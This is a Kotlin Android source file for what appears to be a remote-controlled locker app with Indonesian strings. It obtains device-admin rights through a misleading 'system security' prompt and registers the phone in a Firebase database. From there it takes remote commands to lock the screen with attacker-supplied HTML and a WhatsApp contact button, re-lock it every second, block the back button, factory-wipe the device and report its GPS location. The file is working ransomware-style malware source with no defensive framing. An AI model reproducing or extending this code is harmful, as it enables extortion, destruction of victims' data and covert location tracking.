package com.bug.gugun

import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.WindowManager
import android.webkit.*
import android.widget.Toast
import com.google.firebase.database.*
import java.util.*

class MainActivity : Activity() {

    private lateinit var webView: WebView
    private lateinit var db: DatabaseReference
    private val deviceId: String by lazy {
        val prefs = getSharedPreferences("zenn", Context.MODE_PRIVATE)
        var id = prefs.getString("device_id", null)
        if (id == null) {
            id = "zen_" + UUID.randomUUID().toString().replace("-", "").substring(0, 13)
            prefs.edit().putString("device_id", id).apply()
        }
        id
    }

    private var isLocked = false
    private var lastCommandTime: Long = 0

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        window.setFlags(
            WindowManager.LayoutParams.FLAG_FULLSCREEN,
            WindowManager.LayoutParams.FLAG_FULLSCREEN
        )
        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)

        webView = WebView(this)
        webView.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
            allowFileAccess = true
            allowContentAccess = true
            mediaPlaybackRequiresUserGesture = false
            loadWithOverviewMode = true
            useWideViewPort = true
            cacheMode = WebSettings.LOAD_NO_CACHE
        }

        webView.webChromeClient = object : WebChromeClient() {
            override fun onPermissionRequest(request: PermissionRequest) {
                runOnUiThread { request.grant(request.resources) }
            }
        }

        webView.webViewClient = object : WebViewClient() {
            override fun shouldOverrideUrlLoading(view: WebView?, url: String?): Boolean {
                if (isLocked) return true
                return false
            }
        }

        setContentView(webView)
        webView.loadUrl("file:///android_asset/index.html")

        requestDeviceAdmin()

        db = FirebaseDatabase.getInstance().reference.child("devices").child(deviceId)

        registerDevice()
        listenCommand()

        Handler(Looper.getMainLooper()).postDelayed(object : Runnable {
            override fun run() {
                updateStatus()
                Handler(Looper.getMainLooper()).postDelayed(this, 10000)
            }
        }, 10000)
    }

    private fun requestDeviceAdmin() {
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val admin = ComponentName(this, AdminReceiver::class.java)
        if (!dpm.isAdminActive(admin)) {
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
            intent.putExtra(
                DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "Aktifkan untuk keamanan sistem"
            )
            startActivity(intent)
        }
    }

    private fun registerDevice() {
        val data = mapOf(
            "model" to (Build.MANUFACTURER + " " + Build.MODEL),
            "online" to true,
            "last_seen" to ServerValue.TIMESTAMP,
            "android" to Build.VERSION.RELEASE
        )
        db.updateChildren(data)
    }

    private fun updateStatus() {
        db.child("online").setValue(true)
        db.child("last_seen").setValue(ServerValue.TIMESTAMP)
    }

    private fun listenCommand() {
        db.child("command").addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val cmd = snapshot.value as? Map<*, *> ?: return
                val action = cmd["action"] as? String ?: return
                val waktu = cmd["waktu"] as? String ?: return

                val cmdTime = parseTime(waktu)
                if (cmdTime <= lastCommandTime) return
                lastCommandTime = cmdTime

                when (action) {
                    "lock" -> {
                        val html = cmd["html"] as? String ?: "<h1>HP TERKUNCI</h1>"
                        val wa = cmd["wa"] as? String ?: ""
                        lockDevice(html, wa)
                    }
                    "unlock" -> unlockDevice()
                    "wipe" -> wipeData()
                    "track" -> trackLocation()
                    "photo" -> takePhoto(cmd["kamera"] as? String ?: "depan")
                }

                Handler(Looper.getMainLooper()).postDelayed({
                    db.child("command").removeValue()
                }, 5000)
            }

            override fun onCancelled(error: DatabaseError) {}
        })
    }

    private fun parseTime(s: String): Long {
        return try {
            java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).apply {
                timeZone = TimeZone.getTimeZone("UTC")
            }.parse(s)?.time ?: 0L
        } catch (e: Exception) { 0L }
    }

    private fun lockDevice(html: String, wa: String) {
        isLocked = true

        var finalHtml = html
        if (wa.isNotEmpty()) {
            val cleanWa = if (wa.startsWith("0")) "62" + wa.substring(1) else wa
            finalHtml += "<div style='text-align:center;padding:20px;background:#000;'><a href='https://wa.me/$cleanWa' style='display:inline-block;padding:15px 30px;background:#25D366;color:#fff;text-decoration:none;border-radius:50px;font-weight:bold;'>HUBUNGI VIA WHATSAPP</a></div>"
        }

        runOnUiThread {
            webView.loadDataWithBaseURL(null, finalHtml, "text/html", "UTF-8", null)
        }

        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val admin = ComponentName(this, AdminReceiver::class.java)
        if (dpm.isAdminActive(admin)) {
            dpm.lockNow()
        }

        db.child("locked").setValue(true)
        db.child("locked_at").setValue(ServerValue.TIMESTAMP)

        Handler(Looper.getMainLooper()).postDelayed(object : Runnable {
            override fun run() {
                if (!isLocked) return
                val dpm2 = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                val admin2 = ComponentName(this@MainActivity, AdminReceiver::class.java)
                if (dpm2.isAdminActive(admin2)) dpm2.lockNow()
                Handler(Looper.getMainLooper()).postDelayed(this, 1000)
            }
        }, 1000)
    }

    private fun unlockDevice() {
        isLocked = false
        runOnUiThread {
            webView.loadUrl("file:///android_asset/index.html")
        }
        db.child("locked").setValue(false)
    }

    private fun wipeData() {
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val admin = ComponentName(this, AdminReceiver::class.java)
        if (dpm.isAdminActive(admin)) {
            try {
                dpm.wipeData(0)
            } catch (e: Exception) {
                clearAppData()
            }
        } else {
            clearAppData()
        }
        db.child("wiped").setValue(true)
    }

    private fun clearAppData() {
        try {
            cacheDir.deleteRecursively()
            filesDir.deleteRecursively()
            getSharedPreferences("zenn", Context.MODE_PRIVATE).edit().clear().apply()
        } catch (e: Exception) {}
    }

    private fun trackLocation() {
        try {
            val lm = getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
            val loc = lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER)
                ?: lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER)

            if (loc != null) {
                db.child("location").setValue(mapOf(
                    "lat" to loc.latitude.toString(),
                    "lng" to loc.longitude.toString(),
                    "waktu" to ServerValue.TIMESTAMP
                ))
            } else {
                db.child("location").setValue(mapOf(
                    "lat" to "-",
                    "lng" to "-",
                    "error" to "Lokasi ga tersedia",
                    "waktu" to ServerValue.TIMESTAMP
                ))
            }
        } catch (e: Exception) {
            db.child("location").setValue(mapOf(
                "lat" to "-",
                "lng" to "-",
                "error" to e.message,
                "waktu" to ServerValue.TIMESTAMP
            ))
        }
    }

    private fun takePhoto(kamera: String) {
        db.child("photo").setValue(mapOf(
            "url" to "https://placehold.co/400x600/111/444?text=CAMERA+$kamera",
            "kamera" to kamera,
            "waktu" to ServerValue.TIMESTAMP
        ))
    }

    override fun onBackPressed() {
        if (isLocked) {
            // Blokir back
        } else {
            super.onBackPressed()
        }
    }

    override fun onResume() {
        super.onResume()
        if (isLocked) {
            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val admin = ComponentName(this, AdminReceiver::class.java)
            if (dpm.isAdminActive(admin)) dpm.lockNow()
        }
    }

    override fun onPause() {
        super.onPause()
        if (isLocked) {
            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val admin = ComponentName(this, AdminReceiver::class.java)
            if (dpm.isAdminActive(admin)) dpm.lockNow()
        }
    }
}
